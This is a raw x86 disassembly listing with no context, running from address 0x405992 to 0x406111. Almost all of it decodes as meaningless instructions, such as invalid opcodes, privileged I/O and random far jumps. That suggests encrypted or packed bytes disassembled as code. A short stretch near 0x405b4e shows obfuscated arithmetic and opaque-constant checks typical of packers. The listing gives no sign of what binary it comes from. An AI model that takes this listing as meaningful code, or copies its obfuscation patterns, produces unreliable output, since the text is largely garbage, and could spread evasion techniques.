  405992:	fstp   TBYTE PTR [ebp+0x2e]
  405995:	ds mov cl,0x8b
  405998:	fild   DWORD PTR [ebx+0x71d63d1d]
  40599e:	inc    edx
  40599f:	aas    
  4059a0:	dec    ecx
  4059a1:	scas   eax,DWORD PTR es:[edi]
  4059a2:	outs   dx,DWORD PTR ds:[esi]
  4059a3:	pop    ebx
  4059a4:	push   0x45
  4059a6:	fcmovb st,st(6)
  4059a8:	(bad)  [ebp+esi*4+0x63]
  4059ac:	push   es
  4059ad:	inc    edx
  4059ae:	mov    dl,0x51
  4059b0:	xchg   ebp,eax
  4059b1:	xor    ah,bh
  4059b3:	push   cs
  4059b4:	add    esi,esp
  4059b6:	jno    0x40597a
  4059b8:	jl     0x405946
  4059ba:	xchg   edx,eax
  4059bb:	fistp  DWORD PTR [esi+0x5c]
  4059be:	jae    0x405a29
  4059c0:	and    eax,0x5ccfd4e
  4059c5:	add    DWORD PTR [ecx],ebp
  4059c7:	mov    al,BYTE PTR [eax-0x2d]
  4059ca:	mov    esi,0xf644a2de
  4059cf:	and    esi,DWORD PTR [edx-0x72]
  4059d2:	daa    
  4059d3:	iret   
  4059d4:	jecxz  0x4059ea
  4059d6:	pop    ss
  4059d7:	popa   
  4059d8:	ins    BYTE PTR es:[edi],dx
  4059d9:	std    
  4059da:	push   esi
  4059db:	inc    ecx
  4059dc:	adc    esi,ebp
  4059de:	xchg   BYTE PTR [edi],cl
  4059e0:	inc    esp
  4059e1:	xor    esi,DWORD PTR [edi-0x74425aa2]
  4059e7:	dec    esi
  4059e8:	arpl   WORD PTR [ecx+0x6d],di
  4059eb:	cmc    
  4059ec:	fcom   DWORD PTR [edi]
  4059ee:	sbb    al,0xf0
  4059f0:	lods   eax,DWORD PTR ds:[esi]
  4059f1:	aam    0xb7
  4059f3:	mov    ds:0xa98a9feb,al
  4059f8:	loope  0x405a48
  4059fa:	lods   eax,DWORD PTR ds:[esi]
  4059fb:	sub    eax,0x464dec68
  405a00:	test   BYTE PTR [ecx-0x6b],0x34
  405a04:	or     al,0x3
  405a06:	fimul  WORD PTR [esi-0x517fda7d]
  405a0c:	test   BYTE PTR [eax],bl
  405a0e:	aad    0x31
  405a10:	mov    ebx,0x70179370
  405a15:	mov    edi,0x4abdf5f7
  405a1a:	popf   
  405a1b:	ret    
  405a1c:	shl    BYTE PTR [esp+eax*2+0x71be1eb8],cl
  405a23:	iret   
  405a24:	adc    dl,BYTE PTR [esi+edx*8]
  405a27:	fwait
  405a28:	jle    0x405a8c
  405a2a:	popa   
  405a2b:	ja     0x405a76
  405a2d:	or     eax,ebp
  405a2f:	add    cl,BYTE PTR [esi-0x15]
  405a32:	push   0xffffffb8
  405a34:	dec    ebx
  405a35:	and    bh,BYTE PTR [edx+ebp*4-0x79]
  405a39:	(bad)  
  405a3a:	outs   dx,BYTE PTR ds:[esi]
  405a3b:	xor    BYTE PTR ds:0xed76a573,al
  405a41:	mov    dl,0x76
  405a43:	je     0x405a2a
  405a45:	mov    bl,bl
  405a47:	out    dx,eax
  405a48:	shr    edx,cl
  405a4a:	clc    
  405a4b:	mov    eax,0x8db9872e
  405a50:	mov    al,ds:0x26567476
  405a55:	xor    eax,0x22e72494
  405a5a:	retf   0x6bde
  405a5d:	adc    ebx,edi
  405a5f:	xlat   BYTE PTR ds:[ebx]
  405a60:	xchg   ecx,eax
  405a61:	(bad)  
  405a62:	shr    BYTE PTR [edi+0x1d],1
  405a65:	dec    ebx
  405a66:	hlt    
  405a67:	cdq    
  405a68:	mov    al,ds:0xeddc0c6e
  405a6d:	dec    ecx
  405a6e:	jp     0x405a0f
  405a70:	inc    edi
  405a71:	stos   BYTE PTR es:[edi],al
  405a72:	int3   
  405a73:	stos   BYTE PTR es:[edi],al
  405a74:	(bad)  
  405a75:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  405a77:	(bad)  
  405a78:	or     al,0x8e
  405a7a:	out    dx,al
  405a7b:	mov    ds:0xefd471c,al
  405a80:	shl    bl,1
  405a82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a83:	loop   0x405a13
  405a85:	adc    DWORD PTR [edx+eax*1],ebp
  405a88:	jnp    0x405ac0
  405a8a:	pushf  
  405a8b:	or     edi,DWORD PTR [esi]
  405a8d:	sti    
  405a8e:	leave  
  405a8f:	cdq    
  405a90:	in     al,dx
  405a91:	fs fistp QWORD PTR cs:[edi]
  405a95:	inc    ebp
  405a96:	mov    ebx,0x7bafa9bc
  405a9b:	mov    ecx,DWORD PTR cs:[ecx]
  405a9e:	jg     0x405a40
  405aa0:	stos   DWORD PTR es:[edi],eax
  405aa1:	out    dx,eax
  405aa2:	pop    ecx
  405aa3:	sub    al,0xd3
  405aa5:	(bad)  [ecx]
  405aa7:	int    0x7
  405aa9:	jnp    0x405a5e
  405aab:	xchg   ecx,eax
  405aac:	daa    
  405aad:	leave  
  405aae:	pop    es
  405aaf:	sub    al,0x9
  405ab1:	mov    dl,0xa6
  405ab3:	jg     0x405a6c
  405ab5:	cld    
  405ab6:	jmp    0x405b1c
  405ab8:	callw  0xc436
  405abc:	out    0xab,eax
  405abe:	lea    ebx,[edi+0x61]
  405ac1:	jmp    0x74d:0x41b0b203
  405ac8:	jbe    0x405ad5
  405aca:	add    eax,0x83af5637
  405acf:	ret    0x128a
  405ad2:	cmp    eax,0xbe61c3c2
  405ad7:	cmp    DWORD PTR [edx+0x7b],esp
  405ada:	and    esp,ebx
  405adc:	add    ah,ch
  405ade:	inc    ebx
  405adf:	aad    0xe4
  405ae1:	and    esp,ebx
  405ae3:	into   
  405ae4:	inc    edx
  405ae5:	in     eax,0xca
  405ae7:	cdq    
  405ae8:	sbb    eax,0x449f0dec
  405aed:	xchg   esp,eax
  405aee:	jae    0x405a7d
  405af0:	gs loop 0x405b30
  405af3:	adc    BYTE PTR [esi+0x4a2be139],bl
  405af9:	adc    al,0x69
  405afb:	out    0xa8,al
  405afd:	mov    ds,WORD PTR [esi]
  405aff:	jle    0x405b23
  405b01:	or     edi,DWORD PTR [esi+0x13]
  405b04:	pop    ebp
  405b05:	jmp    0x405b1c
  405b07:	sub    DWORD PTR [ecx-0x4f],esi
  405b0a:	sub    al,0x1b
  405b0c:	and    ah,dh
  405b0e:	or     al,0xae
  405b10:	jmp    0xd391abb5
  405b15:	or     bl,BYTE PTR [ecx+eax*2+0x3d]
  405b19:	adc    DWORD PTR [edi+0x35],eax
  405b1c:	ficomp DWORD PTR [ebx+0x1a]
  405b1f:	adc    ch,dl
  405b21:	mov    al,0x4a
  405b23:	and    BYTE PTR [edi],al
  405b25:	pushf  
  405b26:	cmp    DWORD PTR [edi-0x35],edx
  405b29:	inc    edx
  405b2a:	mov    eax,0xdc64701c
  405b2f:	xor    cl,BYTE PTR [ebx+eax*2-0x46efb277]
  405b36:	ins    DWORD PTR es:[edi],dx
  405b37:	or     al,0x0
  405b39:	add    bh,al
  405b3b:	inc    ebp
  405b3c:	or     BYTE PTR [ebp-0x38f0cb32],bh
  405b42:	inc    ebp
  405b43:	cld    
  405b44:	test   DWORD PTR ds:[eax+edi*8-0x637acd47],ebx
  405b4c:	clc    
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x1de4ab6e
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c38
  405be0:	dec    esp
  405be1:	jecxz  0x405b8c
  405be3:	cmp    BYTE PTR [eax+0x68621b64],0xcf
  405bea:	and    DWORD PTR ds:0x27dad165,esp
  405bf0:	sub    DWORD PTR [ebx-0x54],ecx
  405bf3:	pop    eax
  405bf4:	retf   
  405bf5:	out    0x93,al
  405bf7:	xchg   BYTE PTR [ebx-0x45ba8bd],cl
  405bfd:	rep lods al,BYTE PTR ds:[esi]
  405bff:	inc    ecx
  405c00:	jge    0x9a48dee1
  405c06:	mov    bl,0xf6
  405c08:	jle    0x405c24
  405c0a:	or     cl,BYTE PTR [eax-0x430fa286]
  405c10:	xlat   BYTE PTR ds:[ebx]
  405c11:	fstp   QWORD PTR [edi]
  405c13:	mov    dh,0x81
  405c15:	jo     0x405bf7
  405c17:	mov    ds:0x40501bcb,eax
  405c1c:	aas    
  405c1d:	sub    al,0xd7
  405c1f:	adc    al,0xdf
  405c21:	popf   
  405c22:	and    eax,0xf9b1192b
  405c27:	or     eax,0xe563dd64
  405c2c:	bound  eax,QWORD PTR [esi+0x48823914]
  405c32:	mov    eax,ds:0x7e6250c5
  405c37:	add    ebx,0xfffffffc
  405c3a:	iret   
  405c3b:	(bad)  
  405c3c:	mov    edx,0x81da212a
  405c41:	pop    es
  405c42:	xchg   esp,eax
  405c43:	or     edx,DWORD PTR [eax]
  405c45:	dec    ebx
  405c46:	mov    esi,0xd233a9d5
  405c4b:	xlat   BYTE PTR ds:[ebx]
  405c4c:	aad    0xe8
  405c4e:	mov    ch,0x7d
  405c50:	cmc    
  405c51:	scas   eax,DWORD PTR es:[edi]
  405c52:	dec    ebx
  405c53:	lods   al,BYTE PTR ds:[esi]
  405c54:	jle    0x405c9c
  405c56:	cdq    
  405c57:	adc    esi,edx
  405c59:	mov    edx,0xd2506b19
  405c5e:	adc    eax,ebx
  405c60:	fsubr  st(2),st
  405c62:	pop    ds
  405c63:	push   edx
  405c64:	cdq    
  405c65:	mov    al,0xf
  405c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c68:	scas   al,BYTE PTR es:[edi]
  405c69:	jo     0x405c3a
  405c6b:	cmp    eax,0x68cf7ec0
  405c70:	push   esi
  405c71:	and    eax,0xe97d29c3
  405c76:	scas   eax,DWORD PTR es:[edi]
  405c77:	scas   eax,DWORD PTR es:[edi]
  405c78:	ja     0x405c7f
  405c7a:	fwait
  405c7b:	sti    
  405c7c:	(bad)  
  405c7d:	shr    BYTE PTR [edx-0x1d],cl
  405c80:	cs int 0x99
  405c83:	xlat   BYTE PTR ds:[ebx]
  405c84:	sbb    DWORD PTR [esi+0x4964fd1d],eax
  405c8a:	adc    BYTE PTR [eax+0x32cddd7b],0x8
  405c91:	fs pop ecx
  405c93:	pop    ebx
  405c94:	iret   
  405c95:	icebp  
  405c96:	sub    dl,cl
  405c98:	dec    edi
  405c99:	jl     0x405c7a
  405c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c9c:	test   BYTE PTR [ebx],0xca
  405c9f:	push   0xcc7a9aa9
  405ca4:	pop    eax
  405ca5:	(bad)  
  405ca6:	pop    ds
  405ca7:	add    ch,dh
  405ca9:	popf   
  405caa:	adc    al,0x57
  405cac:	shr    DWORD PTR [ecx-0x7f813d73],1
  405cb2:	dec    ecx
  405cb3:	mov    BYTE PTR [esi],cl
  405cb5:	add    DWORD PTR [eax],ecx
  405cb7:	sub    ecx,DWORD PTR [eax-0x9]
  405cba:	xlat   BYTE PTR ds:[ebx]
  405cbb:	(bad)  
  405cbc:	outs   dx,BYTE PTR ds:[esi]
  405cbd:	cs push ebx
  405cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cc0:	cmp    al,0x5c
  405cc2:	jecxz  0x405c75
  405cc4:	(bad)  
  405cc5:	jge    0x405cfb
  405cc7:	sub    edi,edi
  405cc9:	or     bh,BYTE PTR [ebx]
  405ccb:	and    eax,ebp
  405ccd:	xchg   BYTE PTR [ebx],bh
  405ccf:	jb     0x405cef
  405cd1:	add    al,0xd6
  405cd3:	push   edx
  405cd4:	(bad)  
  405cd5:	ins    DWORD PTR es:[edi],dx
  405cd6:	mov    dh,0x32
  405cd8:	jne    0x405d01
  405cda:	xchg   edx,eax
  405cdb:	scas   eax,DWORD PTR es:[edi]
  405cdc:	adc    DWORD PTR [ebx],0xffffffdf
  405cdf:	add    al,0xf2
  405ce1:	sub    BYTE PTR [ebx],dl
  405ce3:	adc    esp,DWORD PTR [esi+0x4b]
  405ce6:	ins    BYTE PTR es:[edi],dx
  405ce7:	mul    BYTE PTR [esp+edi*8+0x369e2da]
  405cee:	loop   0x405d0a
  405cf0:	push   esp
  405cf1:	add    edi,DWORD PTR [ebp+0x298dc0c2]
  405cf7:	enter  0x601,0xd4
  405cfb:	ror    BYTE PTR [ebx],0x41
  405cfe:	adc    DWORD PTR ss:0x3c3ab6f3,0xa9a4b22b
  405d09:	dec    edi
  405d0a:	imul   edi,ecx,0xffffffde
  405d0d:	ret    
  405d0e:	inc    edi
  405d0f:	pop    ebx
  405d10:	dec    eax
  405d11:	ficom  DWORD PTR [edi-0x7c]
  405d14:	and    edx,edi
  405d16:	cmp    dl,BYTE PTR [edi]
  405d18:	push   0xffffff89
  405d1a:	ret    0xdcb6
  405d1d:	or     esi,DWORD PTR [edi]
  405d1f:	adc    cl,BYTE PTR [ecx-0x6dd9bb18]
  405d25:	iret   
  405d26:	pop    ebx
  405d27:	cmp    eax,0xb41425d8
  405d2c:	inc    ebp
  405d2d:	ins    BYTE PTR es:[edi],dx
  405d2e:	dec    edx
  405d2f:	and    al,0x9e
  405d31:	test   eax,0xdbcb99e9
  405d36:	jnp    0x405d75
  405d38:	inc    ebp
  405d39:	fwait
  405d3a:	pop    ebp
  405d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d3c:	scas   al,BYTE PTR es:[edi]
  405d3d:	sbb    bh,BYTE PTR [edi-0x3c7c6e8]
  405d43:	nop
  405d44:	dec    ecx
  405d45:	iret   
  405d46:	cwde   
  405d47:	jo     0x405cdd
  405d49:	push   0x24ccbd9c
  405d4e:	mov    dh,0x17
  405d50:	cli    
  405d51:	push   ebx
  405d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d53:	out    dx,eax
  405d54:	cmp    edx,eax
  405d56:	(bad)  
  405d57:	sub    bl,BYTE PTR [eax+0x18]
  405d5a:	inc    eax
  405d5b:	xor    edi,DWORD PTR [ecx-0x50]
  405d5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d5f:	outs   dx,DWORD PTR ds:[esi]
  405d60:	fsubr  QWORD PTR cs:[ecx]
  405d63:	imul   esi,DWORD PTR [ebp-0x76096b13],0x3b
  405d6a:	outs   dx,BYTE PTR ds:[esi]
  405d6b:	push   edx
  405d6c:	das    
  405d6d:	aaa    
  405d6e:	cmp    al,ah
  405d70:	push   ds
  405d71:	mov    dh,0xc0
  405d73:	jae    0x405cfc
  405d75:	push   edi
  405d76:	fs inc ebx
  405d78:	mov    esp,0x48526920
  405d7d:	mov    edx,0xb1a9ef03
  405d82:	add    al,0xff
  405d84:	sub    esi,DWORD PTR [edi-0x1bfe4acb]
  405d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d8b:	popa   
  405d8c:	enter  0x34a6,0x7c
  405d90:	xchg   edi,ecx
  405d92:	jbe    0x405d35
  405d94:	test   al,0x53
  405d96:	addr16 retf 
  405d98:	(bad)  [esi]
  405d9a:	test   BYTE PTR [ebp-0x77],al
  405d9d:	fs iret 
  405d9f:	xchg   DWORD PTR [esi],eax
  405da1:	shl    BYTE PTR [ecx],cl
  405da3:	xor    DWORD PTR [ebx],eax
  405da5:	pop    ecx
  405da6:	xor    BYTE PTR [esi-0x5b4ba90e],dh
  405dac:	ds std 
  405dae:	sub    al,0xa2
  405db0:	xor    eax,DWORD PTR [eax]
  405db2:	pop    ds
  405db3:	adc    eax,0xd8358e11
  405db8:	mov    bh,0x2a
  405dba:	push   edx
  405dbb:	jp     0x405d40
  405dbd:	mov    bl,0xeb
  405dbf:	call   FWORD PTR [ebp-0x2]
  405dc2:	push   0xb06b5f49
  405dc7:	inc    esp
  405dc8:	mov    bl,0x53
  405dca:	nop
  405dcb:	mov    al,0x58
  405dcd:	cmp    DWORD PTR [ecx+ebx*8+0x4c],edi
  405dd1:	inc    esi
  405dd2:	xor    cl,BYTE PTR [edi-0xf]
  405dd5:	pop    DWORD PTR cs:[edi]
  405dd8:	out    0x0,al
  405dda:	push   0x3c
  405ddc:	mov    esi,0xbf96ee35
  405de1:	cmc    
  405de2:	and    al,0x7d
  405de4:	retf   
  405de5:	in     al,dx
  405de6:	fcom   DWORD PTR [esi]
  405de8:	jg     0x405e66
  405dea:	cdq    
  405deb:	ror    BYTE PTR [esi],1
  405ded:	scas   al,BYTE PTR es:[edi]
  405dee:	jg     0x405dd7
  405df0:	cmp    edi,DWORD PTR [ebx]
  405df2:	cmp    al,0x2
  405df4:	jbe    0x405e37
  405df6:	jl     0x405ded
  405df8:	int    0x9a
  405dfa:	sbb    esi,eax
  405dfc:	in     eax,dx
  405dfd:	out    0x4f,al
  405dff:	cwde   
  405e00:	clc    
  405e01:	in     eax,0xd6
  405e03:	mov    bl,0x8a
  405e05:	push   esi
  405e06:	push   eax
  405e07:	or     DWORD PTR [edx+eax*8+0x33],ebp
  405e0b:	mov    ds,WORD PTR ds:0x4cec0403
  405e11:	and    esi,DWORD PTR [ebp+esi*2+0x1e]
  405e15:	xor    dl,BYTE PTR [ebx+0x30]
  405e18:	dec    edi
  405e19:	(bad)  
  405e1a:	hlt    
  405e1b:	(bad)  
  405e1c:	jge    0x405e2f
  405e1e:	pop    ecx
  405e1f:	sbb    ebx,ebx
  405e21:	jbe    0x405db2
  405e23:	jno    0x405dd7
  405e25:	mov    ch,BYTE PTR [eax-0x3e61e348]
  405e2b:	inc    eax
  405e2c:	or     eax,0x8b16f460
  405e31:	mov    ds:0xfa3351a9,eax
  405e36:	inc    esi
  405e37:	mov    ebx,0x6742d0fd
  405e3c:	scas   eax,DWORD PTR es:[edi]
  405e3d:	jp     0x405dfb
  405e3f:	ins    BYTE PTR es:[edi],dx
  405e40:	add    edx,esi
  405e42:	(bad)  
  405e43:	nop
  405e44:	inc    esi
  405e45:	test   eax,0xb0eb49e4
  405e4a:	jle    0x405dce
  405e4c:	mov    ebx,0x1df890c1
  405e51:	in     al,0x7c
  405e53:	sti    
  405e54:	fs inc edx
  405e56:	in     al,dx
  405e57:	pop    esp
  405e58:	mov    ecx,0xc61628ad
  405e5d:	shr    BYTE PTR [edi+0x7c],cl
  405e60:	aaa    
  405e61:	imul   esi,DWORD PTR [eax-0x14],0x5a
  405e65:	in     al,dx
  405e66:	mov    edx,0x8c66c1a3
  405e6b:	pop    esp
  405e6c:	(bad)  
  405e6d:	data16 fucomp st(3)
  405e70:	imul   eax,edi,0xffffffda
  405e73:	pop    ecx
  405e74:	(bad)  
  405e75:	dec    esp
  405e76:	in     eax,dx
  405e77:	cmc    
  405e78:	icebp  
  405e79:	ror    BYTE PTR [ebp-0x35],cl
  405e7c:	sar    ebx,1
  405e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e7f:	outs   dx,DWORD PTR ds:[esi]
  405e80:	call   0x396c27aa
  405e85:	xor    edi,edi
  405e87:	inc    eax
  405e88:	xchg   edi,eax
  405e89:	xchg   edx,eax
  405e8a:	popa   
  405e8b:	sbb    bl,BYTE PTR ds:0x6cb96860
  405e91:	out    0x2,al
  405e93:	in     eax,0x4d
  405e95:	push   ecx
  405e96:	test   eax,0x2e21c5fa
  405e9b:	lock inc esi
  405e9d:	xchg   edx,eax
  405e9e:	jp     0x405ebb
  405ea0:	call   0x5766:0xab8a8e69
  405ea7:	jge    0x405e97
  405ea9:	xchg   DWORD PTR [edi+0x78],esi
  405eac:	bound  esp,QWORD PTR [esi]
  405eae:	gs popa 
  405eb0:	xchg   ecx,eax
  405eb1:	lea    ebp,[edi-0x39ecbbc4]
  405eb7:	sbb    DWORD PTR [eax],ebp
  405eb9:	scas   eax,DWORD PTR es:[edi]
  405eba:	shl    DWORD PTR [esi-0x49],0x68
  405ebe:	nop
  405ebf:	sbb    ah,BYTE PTR [ecx]
  405ec1:	mov    dl,0xdc
  405ec3:	mov    ebp,0x1dfd0944
  405ec8:	shr    BYTE PTR [ebp+0x254b357],0xd1
  405ecf:	xor    cl,BYTE PTR [ebx]
  405ed1:	loopne 0x405ea4
  405ed3:	inc    edx
  405ed4:	out    dx,eax
  405ed5:	int    0x74
  405ed7:	call   0x329d:0xc29ecc83
  405ede:	and    ebp,eax
  405ee0:	xchg   ebp,eax
  405ee1:	pop    es
  405ee2:	imul   esi,DWORD PTR [edi],0x7da361c5
  405ee8:	and    al,bl
  405eea:	data16 hlt 
  405eec:	xchg   ecx,eax
  405eed:	adc    DWORD PTR [edi],esi
  405eef:	add    DWORD PTR [edi+0x5c],esp
  405ef2:	mov    BYTE PTR [ebx-0x32],ah
  405ef5:	aaa    
  405ef6:	push   es
  405ef7:	add    esi,DWORD PTR [ecx+0x13ab9eb8]
  405efd:	sbb    ebp,DWORD PTR [ebp-0x6b1192f0]
  405f03:	lahf   
  405f04:	adc    DWORD PTR [ebx+eax*8-0x160de606],ecx
  405f0b:	mov    cl,0xd7
  405f0d:	fisub  WORD PTR [eax-0xecc13fe]
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ebx],gs
  405f27:	cmp    ah,ch
  405f29:	sbb    esp,DWORD PTR [esi+0x2c7e7e30]
  405f2f:	jge    0x405faf
  405f31:	jle    0x405f2e
  405f33:	setb   BYTE PTR [esi]
  405f36:	push   0xffffffc0
  405f38:	xor    ebp,esi
  405f3a:	sub    BYTE PTR [esi-0xc205a7a],ah
  405f40:	shr    DWORD PTR [edx+0x0],1
  405f43:	shr    BYTE PTR [ebp+0x6fbf1586],cl
  405f49:	dec    edx
  405f4a:	sahf   
  405f4b:	dec    esi
  405f4c:	js     0x405f6f
  405f4e:	sbb    al,0x66
  405f50:	jnp    0x405fcc
  405f52:	(bad)  
  405f53:	retf   0x9773
  405f56:	repnz sbb al,0xd2
  405f59:	fcom   QWORD PTR [eax-0x67]
  405f5c:	es test al,0x22
  405f5f:	addr16 loope 0x405f0a
  405f62:	mov    bh,0x7
  405f64:	jmp    0x11de:0x1cfeb6a3
  405f6b:	sbb    dh,al
  405f6d:	cmp    DWORD PTR [ecx-0x3a],0xb633a56b
  405f74:	or     ch,al
  405f76:	sar    BYTE PTR [esi+0x35],cl
  405f79:	dec    edx
  405f7a:	sbb    esi,DWORD PTR [ecx]
  405f7c:	jp     0x405fd5
  405f7e:	(bad)  
  405f7f:	sub    eax,0x62aedc9e
  405f84:	sbb    eax,DWORD PTR [esi]
  405f86:	das    
  405f87:	cmp    eax,DWORD PTR [esi+0x4079c059]
  405f8d:	pop    edi
  405f8e:	inc    edi
  405f8f:	add    ecx,DWORD PTR [ecx+0x62fbe784]
  405f95:	inc    esi
  405f96:	inc    eax
  405f97:	sub    BYTE PTR [esi-0x6e77055e],bh
  405f9d:	sti    
  405f9e:	sar    ebp,cl
  405fa0:	loop   0x405f9b
  405fa2:	inc    edi
  405fa3:	xlat   BYTE PTR ds:[ebx]
  405fa4:	adc    ecx,DWORD PTR [eax]
  405fa6:	push   ds
  405fa7:	sub    ch,BYTE PTR [eax]
  405fa9:	adc    BYTE PTR [edx-0x349b366d],cl
  405faf:	(bad)  
  405fb0:	call   0xbc45c39b
  405fb5:	loop   0x406001
  405fb7:	ss dec esp
  405fb9:	loop   0x40602f
  405fbb:	lods   eax,DWORD PTR ds:[esi]
  405fbc:	lods   eax,DWORD PTR ds:[esi]
  405fbd:	out    0x3d,al
  405fbf:	aas    
  405fc0:	push   es
  405fc1:	pop    esi
  405fc2:	pop    esp
  405fc3:	pusha  
  405fc4:	pop    edi
  405fc5:	cli    
  405fc6:	dec    edx
  405fc7:	rdmsr  
  405fc9:	mov    ds:0x32d3e01b,eax
  405fce:	mov    esp,0xa9ad36e9
  405fd3:	sub    ebp,esp
  405fd5:	cmp    ecx,DWORD PTR [edi+0xbf97d28]
  405fdb:	mov    ?,WORD PTR [edx+0x37]
  405fde:	push   ss
  405fdf:	ja     0x405ffb
  405fe1:	scas   eax,DWORD PTR es:[edi]
  405fe2:	outs   dx,BYTE PTR ds:[esi]
  405fe3:	jbe    0x406004
  405fe5:	inc    ebx
  405fe6:	sbb    bl,ch
  405fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fe9:	xor    bh,BYTE PTR [ebx+0x310cbd58]
  405fef:	sbb    edi,DWORD PTR [edi]
  405ff1:	ret    
  405ff2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  405ff4:	pop    ebx
  405ff5:	retf   0x80cb
  405ff8:	or     ebx,DWORD PTR [edx-0x164d2104]
  405ffe:	or     esp,DWORD PTR [ebp+0x3f845985]
  406004:	ss aam 0xfe
  406007:	out    dx,al
  406008:	aam    0xec
  40600a:	and    eax,DWORD PTR [edx+0x3a]
  40600d:	data16 (bad) 
  40600f:	call   0x1594eaa7
  406014:	sar    ecx,1
  406016:	aas    
  406017:	adc    al,0xf4
  406019:	daa    
  40601a:	jmp    0x40603c
  40601c:	enter  0x5041,0x7e
  406020:	sti    
  406021:	xchg   ebx,eax
  406022:	shl    DWORD PTR [ebp-0x76f7da6a],cl
  406028:	por    mm0,mm0
  40602b:	jae    0x405fbf
  40602d:	xor    ebx,DWORD PTR ds:0x54269dbb
  406033:	mov    ds:0x71f6de70,eax
  406038:	loop   0x406050
  40603a:	aas    
  40603b:	mov    eax,0x932c9788
  406040:	stc    
  406041:	push   edi
  406042:	xchg   DWORD PTR [eax+0x31],edx
  406045:	jno    0x40601b
  406047:	sub    ebp,eax
  406049:	jl     0x406055
  40604b:	sbb    ecx,esi
  40604d:	xor    cl,dh
  40604f:	jnp    0x406018
  406051:	in     eax,dx
  406052:	test   eax,0x5b06c2d9
  406057:	jl     0x4060d0
  406059:	jl     0x406037
  40605b:	inc    edx
  40605c:	adc    ebx,DWORD PTR [esi+0x18ec6736]
  406062:	bnd jns 0x4060ad
  406065:	inc    ebp
  406066:	loope  0x40605e
  406068:	inc    edx
  406069:	push   0xffffffa8
  40606b:	out    dx,al
  40606c:	cmp    DWORD PTR [ecx],0x39ede889
  406072:	sbb    eax,0x99182400
  406077:	fstp   TBYTE PTR [ecx-0xb]
  40607a:	lods   eax,DWORD PTR ds:[esi]
  40607b:	mov    dl,0xfc
  40607d:	loop   0x4060bb
  40607f:	mov    ds:0x193e46e6,al
  406084:	mov    edi,0xedc6f778
  406089:	test   al,0xa5
  40608b:	in     al,0xe1
  40608d:	sub    bl,BYTE PTR [edi-0x52877b21]
  406093:	inc    edi
  406094:	jb     0x4060ac
  406096:	in     eax,dx
  406097:	test   BYTE PTR [ebp+0x76],0x19
  40609b:	and    DWORD PTR [ecx],esp
  40609d:	dec    ebx
  40609e:	xchg   BYTE PTR [ebx-0x63],bl
  4060a1:	cmp    DWORD PTR [ebx+0x16],ebp
  4060a4:	retf   0xde32
  4060a7:	aaa    
  4060a8:	sub    DWORD PTR [edi+eiz*1+0x76],ecx
  4060ac:	add    BYTE PTR [ecx-0x70a745b4],bh
  4060b2:	lea    ebx,[esp+edi*1+0x7]
  4060b6:	mov    WORD PTR [ecx+0x3310fd7c],gs
  4060bc:	out    0x1f,eax
  4060be:	addr16 loope 0x406055
  4060c1:	sbb    BYTE PTR [ebp-0x55],al
  4060c4:	push   es
  4060c5:	and    al,0x65
  4060c7:	fwait
  4060c8:	and    BYTE PTR [ebx],bl
  4060ca:	ret    
  4060cb:	adc    ebp,DWORD PTR [eax+0x29fea30b]
  4060d1:	dec    ebx
  4060d2:	outs   dx,DWORD PTR ds:[esi]
  4060d3:	hlt    
  4060d4:	mov    ch,0xc2
  4060d6:	lock out dx,al
  4060d8:	mov    ds:0x29575d70,eax
  4060dd:	lods   eax,DWORD PTR ds:[esi]
  4060de:	(bad)  
  4060df:	cmp    al,0x41
  4060e1:	das    
  4060e2:	repz and ch,al
  4060e5:	mov    ds:0xd7cd5e12,eax
  4060ea:	call   0xc8f836f3
  4060ef:	dec    eax
  4060f0:	mov    al,0xda
  4060f2:	fild   DWORD PTR [ecx]
  4060f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060f5:	cdq    
  4060f6:	push   cs
  4060f7:	adc    BYTE PTR [esi+ecx*1+0x7d77d7f8],dh
  4060fe:	push   ebx
  4060ff:	sub    ah,BYTE PTR [ecx+0x18]
  406102:	inc    esp
  406103:	jbe    0x40617f
  406105:	cmp    DWORD PTR [esi+0x6ab4eea],ebx
  40610b:	das    
  40610c:	aas    
  40610d:	fcmovu st,st(5)
  40610f:	mov    ah,0xba
  406111:	jecxz  0x406095
